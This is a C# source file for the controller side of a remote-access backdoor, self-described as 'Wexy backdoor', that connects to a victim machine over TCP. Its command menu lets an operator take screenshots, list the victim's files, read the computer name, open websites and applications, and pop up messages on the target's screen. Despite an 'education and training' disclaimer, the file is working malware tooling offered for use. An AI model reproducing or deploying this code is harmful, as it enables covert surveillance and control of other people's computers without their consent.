using System;
using System.Net.Sockets;
using System.Text;

namespace Wexy_Client
{
    class Client
    {
        public static string pcname;
        public static string files;
        public static bool isConnected; //This will allow us to track whether or not we are connected to a server
        public static NetworkStream Receiver; //this is used to get data from the server
        public static NetworkStream Writer; //this is used to send commands to the server

        #region Commands
        public static void SendCommand(string Command)
        {
            try
            {
                if (Command != "showfiles>" && Command != "pcname>")
                {
                    //Creates a packet to hold the command, and gets the bytes from the string variable
                    byte[] Packet = Encoding.ASCII.GetBytes(Command);
                    
                    //Send the command over the network
                    Writer.Write(Packet, 0, Packet.Length);

                    //Flush out any extra data that didnt send in the start.
                    Writer.Flush();
                }
                else
                {
                    switch (Command)
                    {
                        case "pcname>":
                            //Creates a packet to hold the command, and gets the bytes from the string variable
                            byte[] Packet = Encoding.ASCII.GetBytes(Command);

                            //Send the command over the network
                            Writer.Write(Packet, 0, Packet.Length);

                            //Flush out any extra data that didnt send in the start.
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine("PC Name : " + pcname);
                            break;

                        case "showfiles>":
                            //Creates a packet to hold the command, and gets the bytes from the string variable
                            byte[] Packet1 = Encoding.ASCII.GetBytes(Command);

                            //Send the command over the network
                            Writer.Write(Packet1, 0, Packet1.Length);

                            //Flush out any extra data that didnt send in the start.
                            Writer.Flush();
                            ReceiveData();
                            Console.WriteLine(files);
                            break;
                    }
                }
            }
            catch
            {
                isConnected = false;
                Console.WriteLine("Disconnected from server!");
                Console.ReadKey();
                Writer.Close();
            }
        }

        /// <summary>
        /// Receive sent by the server.
        /// </summary>
        public static void ReceiveData()
        {
            //Infinite loop 
            while (true)
            {
                //try to read the data from the client
                try
                {
                    //Packet of the received data
                    byte[] RecPacket = new byte[1000];

                    //Read a command from the client.
                    Receiver.Read(RecPacket, 0, RecPacket.Length);

                    //Flush the receiver
                    Receiver.Flush();

                    //Convert the packet into readable string
                    string data = Encoding.ASCII.GetString(RecPacket);

                    /* Split the command into two different strings based on the splitter we made, >
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(data, ">");

                    //Get the actual command.
                    data = CommandArray[0]; */

                    pcname = data;
                    files = data;
                    break;
                }
                catch
                {
                    break;
                }
            }
        }
        #endregion

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Title = "Client - Offline";

            //The TcpClient that we will use for the connection.
            TcpClient Connector = new TcpClient();

            Console.WriteLine("Wexy backdoor - Made by mem0rYLaek");
            Console.WriteLine("This program was made for education and training purpose only.");
            Console.WriteLine("I'm not responsible for any damage caused by the usage of this application.\n");
            //Get the user to enter IP of the server.
            Console.WriteLine("Enter server IP :");
            string IP = Console.ReadLine();

            try
            {
                Connector.Connect(IP, 2000);
                isConnected = true;

                //Changes the console title
                Console.Title = "Client - Online";

                //Get the stream in the Writer and the receiver
                Writer = Connector.GetStream();
                Receiver = Connector.GetStream();
            }
            catch
            {
                Console.WriteLine("Error connecting to target server ! /nPress any key to restart the program.");
                Console.ReadKey();
                Environment.Exit(0);
            }
            Console.WriteLine("Connection successfully established to " + IP);
            Console.WriteLine("Type help for a list of available commands.");

            while (isConnected)
            {
                Console.Write("wexy> ");
                string command = Console.ReadLine();

                if (command == "help")
                {
                    Console.WriteLine("_____COMMANDS_____");
                    Console.WriteLine("- (Open a website) 'open>http://example.com'");
                    Console.WriteLine("- (Display a message on target's screen) 'msg>message here'");
                    Console.WriteLine("- (Take a screenshot) 'ss>'");
                    Console.WriteLine("- (Get target's computer name) 'pcname>'");
                    Console.WriteLine("- (Show files in a specified folder path) 'showfiles>'");
                    Console.WriteLine("- (Open application) 'openApp>application_name'");
                    Console.WriteLine("- (Disconnect) 'disconnect'");
                    
                }
                else if (command == "disconnect")
                {             
                    try
                    {
                        //Connector.Client.Shutdown(SocketShutdown.Both);
                        //Connector.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
                        //If I set this to false, I can't reconnect -_-
                        Connector.Client.Disconnect(true);
                        Connector.Close();
                        Console.WriteLine("You were disconnected from the server");
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine("Unable to disconnect :" + ex.Message);
                    }
                }
                else
                {
                    SendCommand(command);
                }
            }
            Environment.Exit(0);
        }//end main
    }//End class client
}
